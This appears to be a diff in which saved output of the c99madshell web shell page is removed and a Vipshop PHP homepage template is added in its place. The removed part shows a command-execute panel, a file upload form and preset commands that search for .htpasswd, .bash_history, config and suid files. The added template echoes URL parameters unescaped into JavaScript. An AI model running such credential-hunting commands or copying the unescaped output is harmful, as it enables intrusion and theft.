-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='upload.php';document.todo.submit();">upload.php</a></td>
-<td>271 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='upload.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='upload.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='upload.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='upload.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox59" value="/home/andrew/work/ibscontrols/ibs-controls.com/upload.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='upload_file.php';document.todo.submit();">upload_file.php</a></td>
-<td>443 B</td>
-<td>21.05.2008 21:19:11</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='upload_file.php';document.todo.submit();"><b><font color=green>-rw-r--r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='upload_file.php';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='upload_file.php';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='upload_file.php';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox60" value="/home/andrew/work/ibscontrols/ibs-controls.com/upload_file.php"></td>
-</tr>
-<tr>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='vote.html';document.todo.submit();">vote.html</a></td>
-<td>0 B</td>
-<td>17.12.2014 10:12:32</td>
-<td>andrew/andrew</td>
-<td>&nbsp;<a href="#" onclick="document.todo.act.value='chmod';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.f.value='vote.html';document.todo.submit();"><b><font color=green>-rw-rw-r--</font></b></a></td>
-<td><a href="#" onclick="document.todo.act.value='f';document.todo.f.value='vote.html';document.todo.ft.value='info';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">I</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='vote.html';document.todo.ft.value='edit';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">E</a>&nbsp;<a href="#" onclick="document.todo.act.value='f';document.todo.f.value='vote.html';document.todo.ft.value='download';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com';document.todo.submit();">D</a>&nbsp;<input type="checkbox" name="actbox[]" id="actbox61" value="/home/andrew/work/ibscontrols/ibs-controls.com/vote.html"></td>
-</tr>
-</table><hr size="1" noshade><p align="right">
-  <script>
-  function ls_setcheckboxall(status)
-  {
-   var id = 0;
-   var num = 62;
-   while (id <= num)
-   {
-    document.getElementById('actbox'+id).checked = status;
-    id++;
-   }
-  }
-  function ls_reverse_all()
-  {
-   var id = 0;
-   var num = 62;
-   while (id <= num)
-   {
-    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
-    id++;
-   }
-  }
-  </script>
-  <input type="button" onclick="ls_setcheckboxall(1);" value="Select all">&nbsp;&nbsp;<input type="button" onclick="ls_setcheckboxall(0);" value="Unselect all"><b><select name=act><option value="ls">With selected:</option><option value=delete>Delete</option><option value=chmod>Change-mode</option><option value=cut>Cut</option><option value=copy>Copy</option><option value=unselect>Unselect</option></select>&nbsp;<input type=submit value="Confirm"></p></form></td></tr></table><a bookmark="minipanel"><br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
-<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="#" onclick="document.todo.act.value='cmd';document.todo.d.value='%2Fhome%2Fandrew%2Fwork%2Fibscontrols%2Fibs-controls.com%2F';document.todo.submit();"><b>Command execute</b></a> ::</b></p></td></tr>
-<tr><td width="50%" height="1" valign="top"><center><b>Enter: </b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><input type="text" name="cmd" size="50" value=""><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td><td width="50%" height="1" valign="top"><center><b>Select: </b><form method="POST"><input type=hidden name=act value="cmd"><input type=hidden name="d" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><select name="cmd"><option value="ls -la">-----------------------------------------------------------</option><option value="find / -type f -perm -04000 -ls">find all suid files</option><option value="find . -type f -perm -04000 -ls">find suid files in current dir</option><option value="find / -type f -perm -02000 -ls">find all sgid files</option><option value="find . -type f -perm -02000 -ls">find sgid files in current dir</option><option value="find / -type f -name config.inc.php">find config.inc.php files</option><option value="find / -type f -name &quot;config*&quot;">find config* files</option><option value="find . -type f -name &quot;config*&quot;">find config* files in current dir</option><option value="find / -perm -2 -ls">find all writable folders and files</option><option value="find . -perm -2 -ls">find all writable folders and files in current dir</option><option value="find / -type f -name service.pwd">find all service.pwd files</option><option value="find . -type f -name service.pwd">find service.pwd files in current dir</option><option value="find / -type f -name .htpasswd">find all .htpasswd files</option><option value="find . -type f -name .htpasswd">find .htpasswd files in current dir</option><option value="find / -type f -name .bash_history">find all .bash_history files</option><option value="find . -type f -name .bash_history">find .bash_history files in current dir</option><option value="find / -type f -name .fetchmailrc">find all .fetchmailrc files</option><option value="find . -type f -name .fetchmailrc">find .fetchmailrc files in current dir</option><option value="lsattr -va">list file attributes on a Linux second extended file system</option><option value="netstat -an | grep -i listen">show opened ports</option></select><input type=hidden name="cmd_txt" value="1">&nbsp;<input type=submit name=submit value="Execute"></form></td></tr></TABLE>
-<br>
-<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
-<tr>
- <td width="50%" height="1" valign="top"><center><b>:: <a href="#" onclick="document.todo.act.value='search';document.todo.submit();"><b>Search</b></a> ::</b><form method="POST"><input type=hidden name=act value="search"><input type=hidden name="d" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><input type="text" name="search_name" size="29" value="(.*)">&nbsp;<input type="checkbox" name="search_name_regexp" value="1"  checked> - regexp&nbsp;<input type=submit name=submit value="Search"></form></center></p></td>
- <td width="50%" height="1" valign="top"><center><b>:: <a href="#" onclick="document.todo.act.value='upload';document.todo.submit();"><b>Upload</b></a> ::</b><form method="POST" ENCTYPE="multipart/form-data"><input type=hidden name=act value="upload"><input type="file" name="uploadfile"><input type=hidden name="miniform" value="1">&nbsp;<input type=submit name=submit value="Upload"><br><font color=green>[ ok ]</font></form></center></td>
-</tr>
-</table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Make Dir ::</b><form method="POST"><input type=hidden name=act value="mkdir"><input type=hidden name="d" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><input type="text" name="mkdir" size="50" value="/home/andrew/work/ibscontrols/ibs-controls.com/">&nbsp;<input type=submit value="Create"><br><font color=green>[ ok ]</font></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Make File ::</b><form method="POST"><input type=hidden name=act value="mkfile"><input type=hidden name="d" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><input type="text" name="mkfile" size="50" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><input type=hidden name="ft" value="edit">&nbsp;<input type=submit value="Create"><br><font color=green>[ ok ]</font></form></center></td></tr></table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 height="1" width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="50%" height="1" valign="top"><center><b>:: Go Dir ::</b><form method="POST"><input type=hidden name=act value="ls"><input type="text" name="d" size="50" value="/home/andrew/work/ibscontrols/ibs-controls.com/">&nbsp;<input type=submit value="Go"></form></center></td><td width="50%" height="1" valign="top"><center><b>:: Go File ::</b><form method="POST""><input type=hidden name=act value="gofile"><input type=hidden name="d" value="/home/andrew/work/ibscontrols/ibs-controls.com/"><input type="text" name="f" size="50" value="/home/andrew/work/ibscontrols/ibs-controls.com/">&nbsp;<input type=submit value="Go"></form></center></td></tr></table>
-<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ c99madshell v. 2.0 madnet edition<a href="#" OnClick="document.todo.act.value='about';document.todo.submit();"><u> EDITED BY </b><b>MADNET</u></b> </a>| <a href="http://securityprobe.net"><font color="#FF0000">http://securityprobe.net</font></a><font color="#FF0000"></font> | Generation time: 0.0132 ]--</b></p></td></tr></table>
-</body></html>
+<!doctype html>
+<html lang="zh">
+<head>
+	<meta charset="utf-8" />
+	<link rel="dns-prefetch" href="//s2.vipstatic.com">
+	<link rel="dns-prefetch" href="//a.vpimg1.com">
+	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+	<title>唯品会（原Vipshop.com）特卖会：一家专门做特卖的网站_确保正品_确保低价_货到付款</title>
+	<meta name="keywords" content="唯品会,vip,打折,品牌折扣,限时抢购,特卖" />
+	<meta name="description" content="唯品会vip购物网以1-7折超低折扣对全球各大品牌进行限时特卖，商品囊括服装、化妆品、家居、奢侈品等上千品牌。100%正品、低价、货到付款、7天无条件退货。" />
+	<meta name="baidu-site-verification" content="rnyMiv2JC1" />
+  	<link href="<?php echo $view['staticCss']; ?>/te/<?php echo $view['cssMainVer']; ?>/comm.css?<?php echo $view['cssVer']; ?>" rel="stylesheet" type="text/css" />
+	<link href="<?php echo $view['staticCss']; ?>/te/<?php echo $view['cssMainVer']; ?>/index.css?<?php echo $view['cssVer']; ?>" rel="stylesheet" type="text/css" />
+
+	<!-- 只允许引入两个js文件 -->
+	<script src="<?php echo $view['staticJs']; ?>/jquery.js?<?php echo $view['jsVer']; ?>" type="text/javascript"></script>
+	<script src="<?php echo $view['staticJs']; ?>/core2.js?<?php echo $view['jsVer']; ?>" type="text/javascript"></script>
+    
+	<style type="text/css">
+	body{background-color:<?php echo $bgImg['index_bg_color']; ?>;}
+	.s_bg_right{background:url(<?php echo $bgImg['index_right_img']; ?>) no-repeat 0 1000px;}
+	.s_bg_top{background:url(<?php echo $bgImg['index_top_img']; ?>) no-repeat center top;position: relative;}
+	.s_bg_bottom{background:url(<?php echo $bgImg['index_bottom_img']; ?>) no-repeat center bottom;}
+	</style>
+</head>
+<body>
+	<div class="fly_fav_ico hidden" id="J_min_addMyFav" style="width:20px; height:17px; z-index:999;"></div>
+	<?php 
+		//定义10点前后
+		$isAfter10 = date('H', $_SERVER['REQUEST_TIME']) < 10 ? 0 : 1;
+
+		//定义模版类型，a,a_c分别表示首页和子频道首页
+		$index_type = 'a';
+
+		$userType = $query['user_type'];
+
+  		include($view['basePath'].'/header.html');
+  	?>
+	<div class="s_bg_top">
+	<script type="text/javascript">
+		var VIPTE = {
+			INDEX : {
+				preview : '<?php echo isset($_GET['preview']); ?>',
+				preview_date_from : '<?php echo isset($_GET['sell_time_from']) ? $_GET['sell_time_from'] : ''; ?>',
+				preview_time_from : '<?php echo isset($_GET['time_from']) ? $_GET['time_from'] : ''; ?>'
+			}
+		};
+	</script>
+		<div class="s_bg_bottom">
+			<!--419广告 对联广告 -->
+			<div id="J_ad419_left" class="doub_ad_left hidden"></div>
+			<div id="J_ad419_right" class="doub_ad_right hidden"></div>
+			<?php if (!$isAfter10 && date('H', $_SERVER['REQUEST_TIME']) >= 7){ ?>
+			<!-- 倒计时banner -->
+			<div class="a_banner_cd hidden" id="J_newVistor_banner" style="overflow:hidden;">
+				<div class="a_bcd_con">
+					<span id="J_countDown_hour">0</span>
+					<span class="a_bcd_min" id="J_countDown_min">00</span>
+					<span class="a_bcd_sec" id="J_countDown_sec">00</span>
+				</div>
+			</div>
+			<?php } else { ?>
+			<div class="a_banner_cd hidden" id="J_newVistor_banner" style="overflow:hidden;"><img src="<?php echo $view['staticImg']; ?>/te/resource/banner_a_v2.png" alt=""></div>
+			<?php } ?>
+			<!-- 顶部不自动收起banner广告 -->
+			<div id="J_unSlideup_bannerAd_wrap" class="ad_for419_nav_bottom hidden">
+				<div id="J_unSlideup_bannerAd" class="ad_img" data-height="[39, 272]"></div>
+			</div>
+			<!-- 横幅广告 -->
+			<div class="banner_ad hidden" id="J_wrap_adBanner_wrap">
+				<div id="J_wrap_adBanner" class="ad_img" data-height="[39, 272]"></div>
+				<span class="cut_out cut_out_up" id="J_adBanner_btn"></span>
+			</div>
+			<div style="padding:27px 0 15px">
+			<?php
+				//频道入口模块模块
+				include($view['basePath'].'/comm/classBlock.html');
+			?>
+			</div>
+			<div class="wrap clearfix">
+				<div class="lay642 J_scrollspy" id="J_firstPart_wrap">
+					<!-- 今日上线 -->
+			  		<div class="a_shop_tit a_shop_today_new"></div>
+					<ul class="shop_onsale">
+					<?php $countDown = array();
+						  $today_num = 0;
+						  foreach ($sellingBrandList['part1']['items'] as $key => $item) { 
+							  $start_time = date('m月d日', $item['display_starttime']);
+							  $end_time = date('m月d日', $item['display_endtime']);
+							  $countDown[$item['display_endtime']] = 1;
+							  $today_num++;
+							  $get_story_url = !empty($item['story_url']) ? $item['story_url'] : '/story.php?brandId='.$item['id'];
+					?>
+					<li class="s_mod" data-hover="s_mod_hover">
+						<div class="s_pic J_proPic_wrap">
+							<div class="s_discount">
+								<span><?php echo $item['discount'];?></span>
+								<span><?php echo $start_time.'-'.$end_time;?></span>
+							</div>
+							<a mars_pos="today_<?php echo $item['id'];?>_<?php echo $today_num;?>" href="<?php if ($item['redirect']) { ?><?php echo $item['redirect']; ?><?php }else{ ?>/show-<?php echo $item['id'];?>.html<?php if ($query['channelId'] != 0) { ?>?q=<?php echo $query['channelId']; ?><?php } ?><?php } ?>" target="_blank"><img src="<?php if ($key < 20) { echo $item['index_img']; } else { echo $view['staticImg'].'/te/blank.png" class="lazy" data-original="'.$item['index_img']; } ?>" alt="<?php echo $item['name'];?>" width="640" height="180" /></a>
+							<!--喜欢按钮-->
+							<a href="javascript:;" class="btn_myfav hidden J_myFav_tag J_myFavBrand_<?php echo $item['brand_store_sn'];?>" mars_sead="m_shop_like_button">我喜欢</a>
+						</div>
+						<div class="s_info">
+							<span class="s_info_name" id="J_brandName_<?php echo $item['brand_store_sn'];?>"><?php echo $item['name'];?></span>
+							<span class="s_info_time"><span class="fr J_wrap_pro_<?php echo $item['display_endtime']; ?>"></span>剩余</span>
+							<a class="s_info_story" href="<?php echo $get_story_url; ?>" target="_blank" rel="nofollow">品牌介绍</a>
+						</div>
+					</li>
+					<?php } ?>
+					</ul>
+				</div>
+
+				<div class="lay330 s_bg_right" id="J_right_frame">
+					<div class="a_shop_tit a_shop_rightbar"></div>
+					<?php
+						//引入公司简介模块
+						include($view['basePath'].'/comm/comProfile.html');
+
+						//引入用户评论模块
+						include($view['basePath'].'/comm/comment.html');
+
+						//引入即将开售模块
+						include($view['basePath'].'/comm/salePlan.html');
+					?>
+				</div>
+				
+			</div>
+
+			<?php if ($sellingBrandList['part3']['count'] > 0) { ?>
+			<div class="shoplast J_scrollspy" id="J_hotsell_wrap">
+				<!-- 热销品牌 -->
+				<div class="a_shop_tit a_shop_hotsell"></div>
+				<ul id="J_wrap_pro_add" class="shop_lastest clearfix"></ul>
+			</div>
+			<?php } ?>
+			<?php if (count($readyBrandList['items']) > 0) { ?>
+			<div class="shopcoming J_scrollspy" id="J_coming_wrap">
+				<!-- 即将推出 -->
+				<div class="a_shop_tit a_shop_coming"></div>
+				<ul id="J_readyBrandList" class="shop_unsale clearfix"></ul>
+			</div>
+			<?php } ?>
+		</div>
+		<div class="vip_survey"><p class="vip_survey_content"><a href="//w2.vip.com/brands_research.php" target="_blank" class="survey_icon">您希望在唯品会买到哪些品牌>></a></div>
+	</div>
+
+	<!-- 首页右侧悬浮窗-->
+	<div class="sidebar_block" id="J_sidebar" data-min_size="[42, 130]" data-liheight="31" data-defheight="183">
+	    <ul class="sidebar sidebar_hide guid_b" id="J_sidebar_body" data-min_size="[42, 34]">
+			<li class="sidebar_shrink" id="J_sidebar_control" mars_sead="m_a_handle_anchorlink_close">收起</li>
+	    	<li><a class="sidebar_menu J_sidebar_menu" href="javascript:;" id="J_anchor_today" mars_sead="m_a_handle_anchorlink_1">最新特卖</a><em class="pro_dotted"></em></li>
+	    	<?php if ($sellingBrandList['part3']['count'] > 0) { ?>
+	    	<li><a class="sidebar_menu J_sidebar_menu" href="javascript:;" id="J_anchor_last" mars_sead="m_a_handle_anchorlink_3">最后疯抢</a><em class="pro_dotted"></em></li>
+	    	<?php } ?>
+			<?php if (count($readyBrandList['items']) > 0) { ?>
+	    	<li><a class="sidebar_menu J_sidebar_menu" href="javascript:;" id="J_anchor_ready" mars_sead="m_a_handle_anchorlink_4">即将推出</a></li>
+	    	<?php } ?>
+		</ul> 
+		<ul class="sidebar sidebar_panel">
+	    	<li class="sidebar_panel_li" id="J_sidebar_cartLi">
+				<a class="sidebar_bag_position" id="J_sidebar_cart" data-min_size="[42, 34]" href="<?php echo $view['cartHost']; ?>/" target="_blank" mars_sead="m_a_handle_button_cart">
+					<em class="sidebar_bag_mt" id="J_cart_padding" data-min_size="[42, 6]"></em>
+					<em class="sidebar_bag"></em>
+					<span id="J_sidebar_time" class="sidebar_hide">购物袋</span>
+					<em class="sidebar_bag_icon J_cart_count" id="J_sidebar_cartNum">0</em>
+				</a>
+				<div id="J_sidebar_login" class="sidebar_login_div">
+					<a href="#" class="sidebar_login">登录</a>
+				</div>
+			</li>
+			<li class="sidebar_bag_time_li" id="J_lastTime_tips_wrap" data-min_size="[42, 34]">
+				<div class="sidebar_bag_time">购物袋将在<b class="deep_red">3分钟</b>后被清空，及时结算才能留住抢到的宝贝。</div>
+			</li>
+			<li id="J_likeBrand" class="sidebar_hide" data-min_size="[42, 34]"><a class="sidebar_fav" href="//my.vip.com/account/favbrand.php?from=m_ashop_right_like_link" target="_blank"><span class="hidden">我喜欢的品牌</span></a></li>
+	    	<li><a class="sidebar_totop_position" id="J_toTop" href="javascript:;" data-min_size="[42, 34]">
+	    		<em class="sidebar_totop_mt" id="J_toTop_padding" data-min_size="[42, 10]"></em>
+	    		<em class="sidebar_totop"></em>
+	    		<span class="sidebar_hide hidden" id="J_toTop_text">返回顶部</span>
+	    	</a></li>
+	    </ul>
+	    <div id="J_sidebar_carSection" class="sidebar_car_special hidden"></div>
+	</div>
+
+	<!-- 419广告 左侧ICON -->
+	<div id="J_ad419_left_icon" class="ad_for419_icon hidden"></div>
+	<!-- 开售提醒 -->
+	<div class="a_begin_notice" id="J_refresh_win">
+		<p><a href="javascript:;" class="a_bn_close" id="J_refresh_win_close"></a></p>
+		<p class="a_bn_icon"></p>
+		<p class="a_bn_time">10:00</p>
+		<?php 
+			if (date("Ymd") != 20131128) {
+				//感恩节活动专用
+		?>
+			<p class="a_bn_txt fwr">新品牌已经开售</p>
+		<?php
+			} else {
+		?>
+			<p class="a_bn_txt fwr">老会员专享<br />感恩大回馈专场已开启</p>
+		<?php
+			}
+		?>
+		<p><a href="/" class="a_bn_btn" mars_sead="m_a_alertpop_button_f5">立即刷新</a></p>
+	</div>
+	<a href="/brand_date.php" class="a_mbrand_notice fwr hidden" target="_blank" id="J_bottom_bar" mars_sead="m_a_footerbar_url_dingyue">
+		<span class="a_mbrand_notice_con">
+			<span class="a_mn_icon"></span>
+			<span class="a_mn_txt">喜欢的品牌没上线？</span>
+			<span class="a_mn_link"><i>马上订阅</i>您喜欢的品牌，上线前通知您!</span>
+		</span>
+	</a>
+	
+	<!-- 最后疯抢模板 -->
+	<script type="text/html" id="J_wrap_pro_template">
+	<li class="s1_mod {$itemCount} J_proPic_wrap" data-hover="s1_mod_hover">
+		<div class="s1_pic">
+            <a mars_pos="last_{$id}_{$lastSell_num}" href="{$link}" target="_blank"><img src="<?php echo $view['staticImg']; ?>/te/blank.png" class="lazy" data-original="{$img}" alt="{$alt}" width="310" height="180" /></a>
+            <div class="s_info">
+            	<span class="s1_info_name" id="J_brandName_{$brand_store_sn}">{$name}</span>
+				<a class="s_info_story" href="{$get_story_url}" target="_blank">品牌介绍</a>
+            </div>
+		</div>
+		<div class="s1_info">
+			<span class="a_info_time"><span class="fl a_info_time_txt">剩余</span><span class="fl J_wrap_pro_{$end_time}"></span></span>
+			<span class="s1_info_discount"><span>{$discount}</span></span>
+        </div>
+		<a href="javascript:;" class="btn_myfav hidden J_myFav_tag J_myFavBrand_{$brand_store_sn}" mars_sead="m_shop_like_button">我喜欢</a>
+	</li>
+	</script>
+
+	<script type="text/html" id="J_wrap_ready_template">
+	<li class="s_unsale_list J_unsale J_proPic_wrap" data-hover="s_unsale_list_hover">
+		<div class="s_unsale_mod">
+			<div class="s2_pic">
+				<a href="{$get_story_url}" target="_blank" rel="nofollow">
+					<img src="<?php echo $view['staticImg']; ?>/te/blank.png" class="lazy" data-original="{$index_img2}" alt="{$alt}" width="310" height="180" />
+					<div class="s_book_story_div hidden {$flash}" data-hover="s_book_story_div_hover">
+						<em class="s_book_story"></em>
+						<p class="s_book_story_text"><span class="s_info_story special">品牌介绍</span></p>
+					</div>
+				</a>
+				<div class="s_info">
+					<a class="s_info_story" href="{$get_story_url}" target="_blank" rel="nofollow">品牌介绍</a>
+				</div>
+			</div>	
+			<div class="s1_info">
+				<span class="s1_info_name" id="J_brandName_{$brand_store_sn}">{$name}</span>
+				<span class="s1_info_discount">{$discount}</span>
+			</div>
+			<a href="javascript:;" class="btn_myfav hidden J_myFav_tag J_myFavBrand_{$brand_store_sn}" mars_sead="m_shop_like_button">我喜欢</a>
+			<div class="s_book_notice hidden">
+				<form class="J_book_form" action="" method="get">
+					<div class="s_book_notice_div">
+						<input type="hidden" value="{$id}" name="brandId" />
+						<input type="text" value="请输入手机号码或邮箱" name="email-phone"><button type="submit" class="btn_comm btn100 fl J_book_sub">开售提醒</button>
+					</div>
+					<div class="s_book_tip light_red hidden J_book_warm">请输入正确的手机号码或邮箱<em class="s_book_tip_icon"></em></div>
+				</form>
+			</div>
+		</div>
+		<div id="J_subscribe_box_{$id}" class="pop_index hidden J_subscribe_container"></div>
+	</li>
+	</script>
+	
+	<?php include($view['basePath'].'/modules/popWarehouse.html'); ?>
+
+	<!-- 活动明天上线模块 -->
+	<script type="text/html" id="J_salePlan_act_tmp">
+	<div class="sale_planing_for719" style="background: url(http://a.vpimg4.com/upload/actpics/act/2013/11/1128/mingri.jpg?<?php echo $view['specialVer']; ?>) 0 0 no-repeat;">
+		<form class="J_book_form" method="get" data-act='ThanksGivingDay'>
+ 		<div class="spf">
+ 			<input type="hidden" value="yes" name="isNotice" />
+ 			<input type="hidden" name="brandId" value="85984">
+ 			<input type="text" name="email-phone" value="请输入手机号码" class="spf_input spf_input_fouce" data-act="ThanksGivingDay"><button class="spf_btn J_book_sub" type="submit">订阅开售提醒</button>
+ 		</div>
+ 		<div class="spf_notice J_book_warm">
+ 			<p>请输入正确的手机号码</p>
+ 			<span class="spf_arrow1">
+                <span class="spf_arrow2"></span>
+            </span>
+ 		</div>
+ 		</form>
+ 	</div>
+	</script>
+
+	<script type="text/javascript">
+		//提示修改密码主页标识
+		var changepw_tip = 1;
+		var O_query = <?php echo json_encode($query); ?>;
+		var channelId = <?php echo $query['channelId'];?>;
+		var S_warehouse = wareHouse = '<?php echo $query['warehouse'];?>';
+		var newNum = <?php echo $sellingBrandList['part1']['count'];?>;
+		var hotSellNum = <?php echo $sellingBrandList['part3']['count'];?>;
+		var readyBrandNum = <?php echo count($readyBrandList['items']);?>;
+		var timeStr = {today : '最新特卖', hotSell : '最后疯抢', coming : '即将推出'};
+		var subscribe_txt = ['成功订阅开售提醒，我们将在开售当天通知您。', '网络繁忙，服务器暂时没响应。请重试。'];
+		var showToTop = 815;
+		var def_index = 1; //默认首页标识
+		var front_page = 1; //前台页面标识
+		var myFav_statu_tip = { liked_tips : '<p class="ico_myfav_tips hidden J_liked_tips">您已喜欢过了</p>',
+								sucAddFav_tips : '<p class="ico_myfav_tips hidden J_sucAddFav_tips">已喜欢<a href="//my.vip.com/account/favbrand.php" target="_blank">查看</a></p>'
+								};
+		//静态资源标识(inf.js use)
+		var staticJs = '<?php echo $view['staticJs']; ?>';
+		var jsVer = '<?php echo $view['jsVer']; ?>';
+
+		var omniture = {
+			remind_button : $('.J_book_sub'),
+			is_reminded : function () {
+				return $('.J_subscribe_wraper').is(':visible');
+			}
+		};
+
+		<?php
+	        if (isset($outputVar['adsrich']) && $outputVar['adsrich']) {
+	    ?>
+	    var openAdsrich = 1;
+	    <?php
+	        }
+	    ?>
+	    <?php 
+	        if (isset($outputVar['mediva']) && $outputVar['mediva']) {
+	    ?>
+	    var openMediva = 1;
+	    <?php
+	        }
+	    ?>
+		
+		$.Loader
+			.advScript( {
+				name : 'te-index_a',
+				url : '<?php echo $view['staticJs']; ?>/te/<?php echo $view['jsMainVer']; ?>/index_a.js?<?php echo $view['jsVer']; ?>'
+			}, {
+				name : 'te-index',
+				url : '<?php echo $view['staticJs']; ?>/te/<?php echo $view['jsMainVer']; ?>/index.js?<?php echo $view['jsVer']; ?>'
+			}, {
+				name : 'inf',
+				url : '<?php echo $view['staticJs']; ?>/te/<?php echo $view['jsMainVer']; ?>/inf.js?<?php echo $view['jsVer']; ?>'
+			}, {
+				name : 'inf-2',
+				def : function () { 
+					$(window).load(function () {
+						index();
+						if (typeof openAdsrich != 'undefined') {
+	                      adsrich();
+	                    }
+	                    if (typeof openMediva != 'undefined') {
+	                      mediva();
+	                    }
+					});
+				},
+				requires : ['inf']
+			} );
+		
+		<?php
+			//即将下架
+			$itemCount = 0;
+			$tmpAll = array();
+			foreach ($sellingBrandList['part3']['items'] as $item) { 
+				$itemCount++;
+				$countDown[$item['display_endtime']] = 1;
+				$tmp = array();
+				
+				$start_time = date('m月d日', $item['display_starttime']);
+				$end_time = date('m月d日', $item['display_endtime']);
+
+				$tmp['id'] 		= $item['id'];
+				$tmp['img'] 	= $item['index_img2'];
+				$tmp['discount']= strip_tags($item['discount']);
+				$tmp['name'] 	= $item['name'];
+				$tmp['end_time']= $item['display_endtime'];
+				$tmp['itemCount'] 	= ($itemCount % 3)==0 ? 'special' : '';
+				$tmp['brand_store_sn'] = $item['brand_store_sn'];
+				$tmp['lastSell_num'] = $itemCount;
+				$tmp['get_story_url'] = !empty($item['story_url']) ? $item['story_url'] : '/story.php?brandId='.$item['id'];
+
+				if ($item['redirect']) {
+					$tmp['link']= $item['redirect'];
+				}
+				else {
+					$tmp['link']= '/show-'.$item['id'].'.html';
+					if ($query['channelId'] != 0) { $tmp['link'].= '?q='.$query['channelId']; }
+				}
+				$tmp['alt'] 	= $item['name'].'_'.$start_time.'到'.$end_time.'_全场'.$tmp['discount'].'_唯品会名牌折扣网';
+
+				$tmpAll[] = $tmp;
+			}
+		?>
+		var label = <?php echo json_encode($tmpAll); ?>;
+
+		<?php
+			//即将上线
+			$tmpAll = array();
+			foreach ($readyBrandList['items'] as $item) {
+				$tmp = array();
+
+				$start_time = date('m月d日', $item['display_starttime']);
+				$end_time = date('m月d日', $item['display_endtime']);
+
+				$tmp['id'] 			= $item['id'];
+				$tmp['index_img2'] 	= $item['index_img2'];
+				$tmp['discount'] 	= strip_tags($item['discount']);
+				$tmp['name'] 		= $item['name'];
+				$tmp['alt'] 		= $item['name'].'_'.$start_time.'到'.$end_time.'_全场'.$tmp['discount'].'_唯品会名牌折扣网';
+				$tmp['flash'] 		= $item['flash'] ? '' : 'J_noFlash';
+				$tmp['brand_store_sn'] = $item['brand_store_sn'];
+				$tmp['get_story_url'] = !empty($item['story_url']) ? $item['story_url'] : '/story.php?brandId='.$item['id'];
+
+				$tmpAll[] = $tmp;
+			}
+		?>
+		var readyLabel = <?php echo json_encode($tmpAll); ?>;
